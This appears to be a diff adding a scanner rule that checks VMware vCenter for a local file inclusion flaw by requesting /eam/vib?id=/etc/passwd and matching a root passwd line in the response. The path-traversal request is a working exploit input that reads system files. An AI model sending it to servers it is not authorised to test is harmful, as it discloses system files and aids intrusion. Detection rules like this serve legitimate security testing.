@@ -1,0 +1,10 @@
+name: vmware-vcenter-lfi-linux
+rules:
+  - method: GET
+    path: "/eam/vib?id=/etc/passwd"
+    expression: |
+      response.status == 200 && "root:.*:0:0:".bmatches(response.body)
+detail:
+  author: PR3R00T
+  links:
+    - https://kb.vmware.com/s/article/7960893
